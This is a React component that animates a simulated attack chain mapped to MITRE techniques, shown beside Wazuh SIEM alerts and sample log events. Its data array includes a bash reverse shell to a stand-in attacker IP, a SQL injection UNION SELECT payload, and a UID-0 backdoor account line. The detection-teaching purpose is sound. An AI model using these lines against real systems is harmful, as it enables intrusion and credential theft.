import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Play, SkipForward, AlertOctagon, Terminal, ShieldAlert, Cpu, Lock, X } from 'lucide-react';

const attackSteps = [
  {
    phase: 'Reconnaissance',
    mitre: 'T1595 - Active Scanning',
    attacker: 'Attacker performs Nmap port scan targeting web server IP on ports 80, 443, and 22.',
    wazuh: 'Wazuh Alert Level 10: Rule 5712 (Multiple connection attempts from foreign IP). Sysmon Event ID 3 (Network connection detected).',
    log: `{"event": {"code": "3", "provider": "Microsoft-Windows-Sysmon"}, "network": {"destination": {"port": 22, "ip": "192.168.1.50"}, "source": {"ip": "203.0.113.88"}}, "action": "Portscan detected"}`,
  },
  {
    phase: 'Initial Access',
    mitre: 'T1190 - Exploit Public-Facing Application',
    attacker: 'Attacker fires SQL Injection exploit payload at HTTP GET endpoint /api/users?id=1.',
    wazuh: 'Wazuh Alert Level 12: Rule 31103 (SQL Injection attempt detected in Web logs). Apache access log flags error code 500.',
    log: `{"timestamp": "2026-06-17T12:04:12Z", "rule": {"id": "31103", "level": 12, "description": "SQL Injection vulnerability exploit attempt"}, "data": {"srcip": "203.0.113.88", "request": "GET /api/users?id=1%27%20UNION%20SELECT%20null,username,password%20FROM%20users--"}}`,
  },
  {
    phase: 'Execution',
    mitre: 'T1059 - Command and Scripting Interpreter',
    attacker: 'Attacker uploads a web shell and executes bash commands to launch a reverse shell connection.',
    wazuh: 'Wazuh Alert Level 13: Rule 100200 (Suspicious process spawned by web server user www-data). Sysmon Event ID 1 (Process creation: /bin/sh -i >& /dev/tcp/203.0.113.88/4444 0>&1).',
    log: `{"sysmon": {"EventID": 1, "CommandLine": "sh -i >& /dev/tcp/203.0.113.88/4444 0>&1", "ParentImage": "/usr/sbin/apache2", "User": "www-data", "Image": "/bin/dash"}}`,
  },
  {
    phase: 'Privilege Escalation',
    mitre: 'T1068 - Exploitation for Privilege Escalation',
    attacker: 'Attacker exploits local sudo vulnerability (CVE-2021-3156) to elevate privilege from www-data to root.',
    wazuh: 'Wazuh Alert Level 14: Rule 5402 (Successful sudo execution). Auditd logs show process root privilege shift.',
    log: `{"auditd": {"type": "SYSCALL", "syscall": "execve", "success": "yes", "uid": "www-data", "euid": "root", "exe": "/usr/bin/sudoedit"}}`,
  },
  {
    phase: 'Persistence',
    mitre: 'T1136.001 - Create Account: Local Account',
    attacker: 'Attacker creates a backdoor system administrator account "backdoor_admin" and adds it to the sudoers group.',
    wazuh: 'Wazuh Alert Level 11: Rule 5902 (User account created). Wazuh File Integrity Monitoring (FIM) flags modifications in /etc/passwd and /etc/shadow.',
    log: `{"fim": {"path": "/etc/passwd", "event": "modified", "diff": "+backdoor_admin:x:0:0::/home/backdoor_admin:/bin/bash"}, "syslog": {"message": "useradd: new user added: name=backdoor_admin"}}`,
  },
  {
    phase: 'Defense Evasion',
    mitre: 'T1562.001 - Impair Defenses: Disable System Logging',
    attacker: 'Attacker executes "systemctl stop auditd" and attempts to clear system logs to hide malicious traces.',
    wazuh: 'Wazuh Alert Level 15 (CRITICAL): Rule 100311 (Audit daemon stopped unexpectedly). Wazuh triggers Active Response to block IP 203.0.113.88 on local firewall.',
    log: `{"alert": "CRITICAL", "trigger": "Active Response", "action": "iptables -A INPUT -s 203.0.113.88 -j DROP", "message": "Host system defense impaired, firewall blocks source IP"}`,
  },
];

const AttackSimulator = ({ onClose }) => {
  const [currentStep, setCurrentStep] = useState(0);
  const [isPlaying, setIsPlaying] = useState(true);

  const playAlertSound = (freq = 220, duration = 0.15, type = 'sawtooth') => {
    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioCtx.createOscillator();
      const gainNode = audioCtx.createGain();

      oscillator.type = type;
      oscillator.frequency.value = freq;
      
      gainNode.gain.setValueAtTime(0.08, audioCtx.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);

      oscillator.connect(gainNode);
      gainNode.connect(audioCtx.destination);
      
      oscillator.start();
      oscillator.stop(audioCtx.currentTime + duration);
    } catch (e) {}
  };

  useEffect(() => {
    if (currentStep === 5) {
      playAlertSound(440, 0.4, 'sawtooth');
      setTimeout(() => playAlertSound(330, 0.4, 'sawtooth'), 200);
    } else {
      playAlertSound(260 + currentStep * 40, 0.2, 'sine');
    }
  }, [currentStep]);

  useEffect(() => {
    playAlertSound(150, 0.5, 'square');
  }, []);

  useEffect(() => {
    if (!isPlaying) return;
    const timer = setInterval(() => {
      setCurrentStep((prev) => {
        if (prev < attackSteps.length - 1) return prev + 1;
        setIsPlaying(false);
        return prev;
      });
    }, 4500);

    return () => clearInterval(timer);
  }, [isPlaying]);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-cyber-bg-darkest/95 p-4 font-mono select-none overflow-y-auto">
      {/* Red grid background overlay */}
      <div 
        className="absolute inset-0 opacity-15 pointer-events-none" 
        style={{
          backgroundImage: `
            linear-gradient(rgba(234, 67, 53, 0.1) 1px, transparent 1px),
            linear-gradient(90deg, rgba(234, 67, 53, 0.1) 1px, transparent 1px)
          `,
          backgroundSize: '40px 40px'
        }} 
      />
      <div className="absolute inset-0 bg-radial-gradient from-transparent to-black pointer-events-none" />

      {/* Main UI console */}
      <div className="relative w-full max-w-4xl glassmorphism-red rounded-xl overflow-hidden border-2 border-google-red shadow-2xl flex flex-col my-auto">
        {/* Banner/Title bar */}
        <div className="bg-google-red/10 border-b border-google-red/40 px-4 py-3 flex items-center justify-between text-google-red animate-pulse">
          <div className="flex items-center gap-2">
            <AlertOctagon size={18} className="animate-spin" style={{ animationDuration: '3s' }} />
            <span className="font-bold tracking-widest text-sm uppercase">
              SECURITY OPERATIONS: ANOMALOUS INCIDENT DETECTED
            </span>
          </div>
          <button 
            onClick={onClose}
            className="text-google-red hover:text-white border border-google-red/30 hover:border-google-red/80 px-2.5 py-1 rounded bg-cyber-bg-darkest/50 hover:bg-google-red/10 transition-all cursor-pointer text-xs flex items-center gap-1.5"
          >
            <X size={14} />
            <span>CLOSE SCANNER</span>
          </button>
        </div>

        {/* Content area */}
        <div className="p-4 sm:p-6 grid grid-cols-1 md:grid-cols-3 gap-6 flex-1 text-left min-h-[380px]">
          {/* Left Panel: Attack Chain Navigation */}
          <div className="flex flex-col gap-2 border-r border-cyber-bg-gray/40 pr-0 md:pr-4">
            <span className="text-[10px] text-google-red/70 font-semibold uppercase tracking-wider mb-2">
              Cyber Attack Chain (MITRE)
            </span>
            {attackSteps.map((step, idx) => (
              <button
                key={step.phase}
                onClick={() => {
                  setCurrentStep(idx);
                  setIsPlaying(false);
                }}
                className={`w-full py-2.5 px-3 rounded text-xs text-left transition-all flex items-center justify-between border cursor-pointer ${
                  currentStep === idx
                    ? 'bg-google-red/15 border-google-red/60 text-white font-bold shadow-lg'
                    : 'bg-cyber-bg-darkest/30 border-cyber-bg-gray/50 hover:border-cyber-bg-gray text-cyber-text-muted hover:text-cyber-text-light'
                }`}
              >
                <div className="flex items-center gap-2">
                  <span className={`w-1.5 h-1.5 rounded-full ${currentStep === idx ? 'bg-google-red animate-ping' : 'bg-white/20'}`} />
                  <span>{step.phase}</span>
                </div>
                {idx < currentStep && <span className="text-google-green text-[9px] font-bold">✓ DETECTED</span>}
                {idx === currentStep && <span className="text-google-red text-[9px] font-bold animate-pulse">TRIGGERED</span>}
                {idx > currentStep && <span className="text-white/20 text-[9px]">PENDING</span>}
              </button>
            ))}

            {/* Play/Pause controls */}
            <div className="flex gap-2 mt-auto pt-4 border-t border-cyber-bg-gray/40">
              <button
                onClick={() => setIsPlaying(!isPlaying)}
                className="flex-1 py-2 px-3 bg-cyber-bg-darkest/50 hover:bg-cyber-bg-gray/40 border border-cyber-bg-gray rounded text-xs flex items-center justify-center gap-1.5 cursor-pointer text-cyber-text-light transition-all"
              >
                <Play size={12} className={isPlaying ? 'text-google-yellow' : 'text-google-green'} />
                <span>{isPlaying ? 'PAUSE FLOW' : 'AUTO PLAY'}</span>
              </button>
              <button
                onClick={() => {
                  setCurrentStep((prev) => (prev < attackSteps.length - 1 ? prev + 1 : 0));
                  setIsPlaying(false);
                }}
                className="py-2 px-3 bg-cyber-bg-darkest/50 hover:bg-cyber-bg-gray/40 border border-cyber-bg-gray rounded text-xs flex items-center justify-center cursor-pointer text-cyber-text-light"
                title="Next Step"
              >
                <SkipForward size={12} />
              </button>
            </div>
          </div>

          {/* Right Panel: Detail Log Viewer & Wazuh Alert Analysis */}
          <div className="md:col-span-2 flex flex-col gap-4">
            {/* Phase info card */}
            <div className="bg-cyber-bg-darker/60 p-4 rounded-lg border border-google-red/20 shadow-inner">
              <div className="flex justify-between items-center mb-1">
                <span className="text-[10px] text-google-blue font-bold tracking-wider uppercase bg-google-blue/10 border border-google-blue/30 px-1.5 py-0.5 rounded">
                  {attackSteps[currentStep].mitre}
                </span>
                <span className="text-[9px] text-google-red/80 font-bold bg-google-red/10 border border-google-red/30 px-1.5 py-0.5 rounded animate-pulse">
                  STAGE 0{currentStep + 1}
                </span>
              </div>
              <h3 className="text-cyber-text-white font-bold text-base mb-2 font-sans tracking-wide">
                {attackSteps[currentStep].phase}
              </h3>
              <p className="text-xs text-cyber-text-light leading-relaxed mb-3 font-sans">
                {attackSteps[currentStep].attacker}
              </p>
            </div>

            {/* Wazuh SIEM Shield report */}
            <div className="bg-cyber-bg-darker/60 p-4 rounded-lg border border-google-green/20">
              <div className="flex items-center gap-1.5 mb-1.5">
                <ShieldAlert size={14} className="text-google-green animate-pulse" />
                <span className="text-[10px] text-google-green font-bold uppercase tracking-widest">
                  WAZUH SIEM TELEMETRY ANALYSIS
                </span>
              </div>
              <p className="text-xs text-cyber-text-light leading-relaxed font-sans">
                {attackSteps[currentStep].wazuh}
              </p>
            </div>

            {/* Live Sysmon JSON Event Feed */}
            <div className="flex-1 flex flex-col bg-cyber-bg-darkest/90 border border-cyber-bg-gray rounded-lg overflow-hidden">
              <div className="bg-cyber-bg-gray/30 px-3 py-1.5 border-b border-cyber-bg-gray flex justify-between items-center">
                <span className="text-[9px] text-cyber-text-muted font-bold flex items-center gap-1.5">
                  <Terminal size={10} className="text-google-yellow" />
                  RAW TELEMETRY TELESTREAM LOG
                </span>
                <span className="w-1.5 h-1.5 rounded-full bg-google-red animate-ping" />
              </div>
              <div className="p-3 text-[10px] text-google-yellow font-mono overflow-y-auto leading-relaxed flex-1 select-text scrollbar-thin max-h-[140px]">
                {attackSteps[currentStep].log}
              </div>
            </div>
          </div>
        </div>

        {/* Console status footer */}
        <div className="bg-cyber-bg-darker/90 px-4 py-2 border-t border-cyber-bg-gray flex flex-col sm:flex-row items-center justify-between text-[10px] text-cyber-text-muted gap-2">
          <span>THREAT MITIGATION: ACTIVE RESPONSE IN QUEUE</span>
          <div className="flex items-center gap-4">
            <span className="flex items-center gap-1">
              <Cpu size={10} className="text-google-blue animate-pulse" />
              CPU: 12.8%
            </span>
            <span className="flex items-center gap-1">
              <Lock size={10} className="text-google-red" />
              FIREWALL STATE: ENFORCING
            </span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AttackSimulator;
